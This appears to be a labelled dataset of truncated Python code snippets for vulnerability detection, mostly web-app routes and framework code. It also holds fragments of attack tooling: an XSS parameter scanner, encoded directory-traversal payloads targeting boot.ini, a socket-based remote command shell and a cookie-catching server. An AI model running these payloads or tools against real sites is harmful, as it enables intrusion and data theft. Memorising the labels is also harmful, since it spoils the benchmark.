require_all_fields=kwargs.pop('require_all_fields',", "label": 0}, {"snippet_id": 24777, "code": " Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback", "label": 0}, {"snippet_id": 9735, "code": "', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login", "label": 0}, {"snippet_id": 28815, "code": ".AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t\t\tk=paramiko.RSAKey.from_private_key_file(ssh_key_name) \t\t\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, pkey=k) \t\telse: \t\t\tssh.connect(hostname", "label": 0}, {"snippet_id": 3018, "code": ",scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers", "label": 0}, {"snippet_id": 42344, "code": "\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t", "label": 0}, {"snippet_id": 7780, "code": "\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^", "label": 0}, {"snippet_id": 9251, "code": "?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses", "label": 0}, {"snippet_id": 16986, "code": "+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',", "label": 0}, {"snippet_id": 47686, "code": " password: ')) f.add_content(PasswordField(name='confirm_password', required=False)) f.add_content(PlainText(get_csrf_form_element(http_request))) f.add_content(SubmitButton()) a='<div class=\"w3-row w3-padding", "label": 0}, {"snippet_id": 14753, "code": ") ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly", "label": 0}, {"snippet_id": 41016, "code": " and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name", "label": 0}, {"snippet_id": 13539, "code": "[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 42090, "code": "(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None", "label": 0}, {"snippet_id": 6482, "code": ". If a user has an active SSO session, they will get SAML assertions made without having to authenticate again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP", "label": 0}, {"snippet_id": 53903, "code": " print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def", "label": 1}, {"snippet_id": 8471, "code": " admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard", "label": 0}, {"snippet_id": 25139, "code": "\nimport copy import logging from decimal import Decimal import dateutil.parser import pytz import vat_moss.errors import vat_moss.id from django import forms from django.contrib import messages from django", "label": 0}, {"snippet_id": 36545, "code": "\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters", "label": 0}, {"snippet_id": 38967, "code": "[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in", "label": 0}, {"snippet_id": 44273, "code": "'workflows_json': json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id", "label": 1}, {"snippet_id": 34215, "code": "\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse:", "label": 0}, {"snippet_id": 28458, "code": "\tlogin='' \t \tif not os.path.exists(log_path): \t\tos.makedirs(log_path) \t\t \ttry: \t\tIP=cgi.escape(os.environ[\"REMOTE_ADDR\"]) \t\tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \t\tuser_uuid=cookie", "label": 0}, {"snippet_id": 27531, "code": "'csrf_token': form.generate_csrf_token(), 'dest': dest_url, }) class _MenuItem(object): \"\"\"A menu item used for rendering an item in the main navigation.\"\"\" def __init__(self, name, href): self.name=name", "label": 0}, {"snippet_id": 24804, "code": ") ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print ", "label": 0}, {"snippet_id": 32118, "code": "(self, request, obj_id): api.keystone.mapping_delete(request, obj_id) class MappingFilterAction(tables.FilterAction): def filter(self, table, mappings, filter_string): \"\"\"Naive case-insensitive search.\"", "label": 0}, {"snippet_id": 52505, "code": " } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}", "label": 0}, {"snippet_id": 19000, "code": "(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings", "label": 0}, {"snippet_id": 1021, "code": "='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url", "label": 1}, {"snippet_id": 36990, "code": "(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None", "label": 0}, {"snippet_id": 4700, "code": "'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', ", "label": 0}, {"snippet_id": 3439, "code": " headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='", "label": 0}, {"snippet_id": 10171, "code": ".assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}", "label": 0}, {"snippet_id": 47716, "code": " check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str):", "label": 0}, {"snippet_id": 36878, "code": ".form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger ", "label": 0}, {"snippet_id": 41953, "code": "\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0", "label": 0}, {"snippet_id": 23998, "code": " means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit", "label": 0}, {"snippet_id": 28707, "code": "'uuid') \ttry: \t\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 \t\tpass \tlevel=kwargs.get(\"level\") \t\t \tif level is None: \t\tlevel=1 \t\t \ttry: \t\treturn True if role <=level else False \texcept:", "label": 0}, {"snippet_id": 44191, "code": " import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import", "label": 0}, {"snippet_id": 49830, "code": "/script> ''' @app.route('/',methods=['GET']) def shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command+\"\\n\") if", "label": 0}, {"snippet_id": 46627, "code": "='core/benefit_overview.html' def get_context_data(self): data=super().get_context_data() data['life_conditions']=LifeCondition.objects.with_benefits() return data class BenefitClaimView(FormView): template_name", "label": 0}, {"snippet_id": 27970, "code": " local_config from handlers import base_handler from libs import auth from libs import handler from libs import helpers from metrics import logs SESSION_EXPIRY_DAYS=14 class Handler(base_handler.Handler): ", "label": 0}, {"snippet_id": 29799, "code": ".get_dick_permit(ip=serv) \tfor server in servers: \t\tif server !=\"\": \t\t\tprint(\"ok\") \t\t\tsys.exit() \tsys.exit() if form.getvalue('token') is None: \tprint(\"What the fuck?! U r hacker Oo?!\") \tsys.exit() \t\t if", "label": 0}, {"snippet_id": 23453, "code": "', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid", "label": 0}, {"snippet_id": 34021, "code": ":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format", "label": 0}, {"snippet_id": 18981, "code": "'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'", "label": 0}, {"snippet_id": 32320, "code": ".realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)) return 1 rpath=os.path.relpath(path, top_level) url='%s/%s' %(origin, rpath) print('Opening %s' ", "label": 0}, {"snippet_id": 17450, "code": ", 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$", "label": 0}, {"snippet_id": 18993, "code": " +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=(", "label": 0}, {"snippet_id": 34157, "code": "\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document", "label": 0}, {"snippet_id": 34750, "code": ".format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns", "label": 0}, {"snippet_id": 5328, "code": " 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's'", "label": 0}, {"snippet_id": 54936, "code": "', 'approved_strings', 'fuzzy_strings', 'strings_with_errors', 'strings_with_warnings', 'unreviewed_strings', ]) locale.aggregate_stats() for project in projects: project.aggregate_stats() ProjectLocale", "label": 0}, {"snippet_id": 43059, "code": ".fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for", "label": 0}, {"snippet_id": 31733, "code": "\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>') \t\t if form.getvalue('bwlists_create'): \tlist_name=form.getvalue('bwlists_create').split('.')[0]", "label": 0}, {"snippet_id": 37370, "code": "--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list", "label": 0}, {"snippet_id": 43115, "code": ",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif", "label": 0}, {"snippet_id": 15058, "code": ".format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir", "label": 0}, {"snippet_id": 44590, "code": " for node in workflow['nodes'] if node['type']=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data", "label": 0}, {"snippet_id": 19950, "code": ") self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files", "label": 0}, {"snippet_id": 34171, "code": ":param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\"", "label": 0}, {"snippet_id": 47662, "code": "'<br /><br />Change password(leave blank in order to not change it):')) else: f.add_content(PlainText('<br />Choose a password: ')) f.add_content(PasswordField(name='password', required=False)) f.add_content", "label": 0}, {"snippet_id": 35278, "code": " for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))", "label": 0}, {"snippet_id": 1941, "code": "\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param", "label": 0}, {"snippet_id": 18201, "code": ".course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware", "label": 0}, {"snippet_id": 13745, "code": "'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=", "label": 1}, {"snippet_id": 38994, "code": " \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None", "label": 0}, {"snippet_id": 4185, "code": "(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1", "label": 0}, {"snippet_id": 45501, "code": "=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def", "label": 0}, {"snippet_id": 39992, "code": " _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=", "label": 0}, {"snippet_id": 41360, "code": " limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t", "label": 0}, {"snippet_id": 44830, "code": " if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data", "label": 0}, {"snippet_id": 15410, "code": " msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green", "label": 0}, {"snippet_id": 179, "code": " uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'", "label": 0}, {"snippet_id": 49887, "code": "\"donate to us via bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at:{{ venmo_address}}\", \"donate to us via beemit at:{{ beemit_address}}\", ]", "label": 1}, {"snippet_id": 52269, "code": ".copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow", "label": 0}, {"snippet_id": 22293, "code": "'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib", "label": 0}, {"snippet_id": 15328, "code": "'serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity", "label": 0}, {"snippet_id": 53037, "code": " new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator", "label": 0}, {"snippet_id": 22767, "code": ")/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 1}, {"snippet_id": 46160, "code": "'engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections: return no_collections(request) collection=Collection2(user=request.user, name=collections[0], engine=engine", "label": 0}, {"snippet_id": 28135, "code": ".SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \tuser=sql.get_user_name_by_uuid(user_id.value) \tservers=sql.get_dick_permit() \ttoken=sql.get_token(user_id.value) \trole=sql.get_user_role_by_uuid", "label": 0}, {"snippet_id": 45888, "code": " properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail=ex._headers.get('oozie-error-message', ex", "label": 0}, {"snippet_id": 8477, "code": ", 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user", "label": 0}, {"snippet_id": 1222, "code": "'headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert", "label": 0}, {"snippet_id": 23182, "code": "]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', ", "label": 0}, {"snippet_id": 2877, "code": ".urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload", "label": 0}, {"snippet_id": 46007, "code": "\"klass\":\"card card-home card-column span10\"}, ] def index(request, is_mobile=False): hue_collections=DashboardController(request.user).get_search_collections() collection_id=request.GET.get('collection')", "label": 0}, {"snippet_id": 46331, "code": "\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"} ], 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable':", "label": 0}, {"snippet_id": 34508, "code": ".__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format", "label": 0}, {"snippet_id": 9765, "code": "'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views", "label": 0}, {"snippet_id": 27246, "code": ": For testing purposes only!\\n\" if __name__==\"__main__\": banner() if len(sys.argv) !=2: print \"program[url]\" exit() url=sys.argv[1] if url.find(\"http\") !=0: print \"[-] Invalid target\" exit() m=re.match", "label": 1}, {"snippet_id": 12935, "code": "(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service", "label": 0}, {"snippet_id": 39501, "code": " \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self", "label": 0}, {"snippet_id": 46728, "code": "'claimable_benefits': Benefit.objects.find_claimable(selected_flags), }) class BenefitDetailView(DetailView): model=Benefit template_name='core/benefit_detail.html' def get_context_data(self, *args, **kwargs)", "label": 0}, {"snippet_id": 49579, "code": " search_query_param=None, ordering_query_param=None): self.object_list=object_list self.model=object_list.model self.query_params=query_params or{} self.list_display=list_display or[] self.list_filter=list_filter or", "label": 0}, {"snippet_id": 47917, "code": " rights=int(request.POST[\"rights\"]) if not check_password_conformity(pw1, pw2): recreate_form('password mismatch') auth_user: User=User.objects.create_user(username=username, email=mail, password=pw1) auth_user", "label": 1}, {"snippet_id": 37092, "code": "\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger", "label": 0}, {"snippet_id": 52144, "code": "'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc", "label": 1}, {"snippet_id": 2987, "code": " if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\"", "label": 0}, {"snippet_id": 10356, "code": ", shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite", "label": 0}, {"snippet_id": 6319, "code": "): \"\"\" The port the IdP authentication should listen on(integer). \"\"\" return self.config.getint(self.section, 'listen_port') @property def pysaml2_config(self): \"\"\" pysaml2 configuration file. Separate", "label": 0}, {"snippet_id": 19579, "code": ".start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ", "label": 0}, {"snippet_id": 24650, "code": ".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity=", "label": 0}, {"snippet_id": 32096, "code": " Mapping\", u\"Delete Mappings\", count ) @staticmethod def action_past(count): return ungettext_lazy( u\"Deleted Mapping\", u\"Deleted Mappings\", count ) policy_rules=((\"identity\", \"identity:delete_mapping\"", "label": 0}, {"snippet_id": 26985, "code": " return return def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global lfi_attacks global lfi_expect global DEBUG if page.find(\"http://\")==0 or page.find", "label": 0}, {"snippet_id": 37111, "code": " ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t", "label": 0}, {"snippet_id": 45541, "code": " @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([", "label": 0}, {"snippet_id": 4060, "code": "\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result", "label": 0}, {"snippet_id": 26657, "code": "'../../../boot.ini', '../../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '../../../../../../../boot.ini', '../../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini'", "label": 0}, {"snippet_id": 9000, "code": "[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name", "label": 0}, {"snippet_id": 16303, "code": "/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name", "label": 0}, {"snippet_id": 679, "code": ".insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query:", "label": 0}, {"snippet_id": 26711, "code": "%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 5401, "code": "'onclick', 'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', ", "label": 0}, {"snippet_id": 7460, "code": ", url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch", "label": 0}, {"snippet_id": 11623, "code": "<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration", "label": 0}, {"snippet_id": 47609, "code": " ')) f.add_content(NumberField(name='dect', minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0", "label": 0}, {"snippet_id": 1424, "code": " pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[", "label": 0}, {"snippet_id": 44563, "code": "=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description,", "label": 0}, {"snippet_id": 26406, "code": " contact support to ' 'resolve this manually.')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm(BaseInvoiceAddressForm): def __init__(self, *args, **kwargs): super().__init__(*args", "label": 0}, {"snippet_id": 54261, "code": "\"\"] ua+=bane.ua li=bane.read_file('xss.txt') pl=[] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0,'http://') global cookie cookie=Entry", "label": 1}, {"snippet_id": 